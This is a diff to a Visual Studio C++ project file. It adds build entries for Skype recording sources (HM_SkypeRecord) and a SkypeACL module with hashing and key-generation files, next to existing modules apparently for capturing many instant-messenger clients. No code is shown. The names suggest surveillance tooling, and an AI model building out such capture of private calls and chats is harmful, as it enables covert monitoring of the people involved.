@@ -158,6 +158,7 @@
   </ItemDefinitionGroup>
   <ItemGroup>
     <ClCompile Include="HM_IMAgent.cpp" />
+    <ClCompile Include="HM_SkypeRecord.cpp" />
     <ClCompile Include="QAgent.cpp" />
     <ClCompile Include="QIcq.cpp" />
     <ClCompile Include="QIcq7.cpp" />
@@ -180,8 +181,12 @@
     <ClCompile Include="QYim7.cpp" />
     <ClCompile Include="QYim8.cpp" />
     <ClCompile Include="QYim9.cpp" />
+    <ClCompile Include="SkypeACL\HashUtil.cpp" />
+    <ClCompile Include="SkypeACL\KeyGen_SBOX.cpp" />
+    <ClCompile Include="SkypeACL\SkypeACL.cpp" />
   </ItemGroup>
   <ItemGroup>
+    <ClInclude Include="HM_SkypeRecord.h" />
     <ClInclude Include="QAgent.h" />
     <ClInclude Include="QIcq.h" />
     <ClInclude Include="QIcq7.h" />
@@ -204,6 +209,8 @@
     <ClInclude Include="QYim7.h" />
     <ClInclude Include="QYim8.h" />
     <ClInclude Include="QYim9.h" />
+    <ClInclude Include="SkypeACL\HashUtil.h" />
+    <ClInclude Include="SkypeACL\KeyGen_SBOX.h" />
   </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
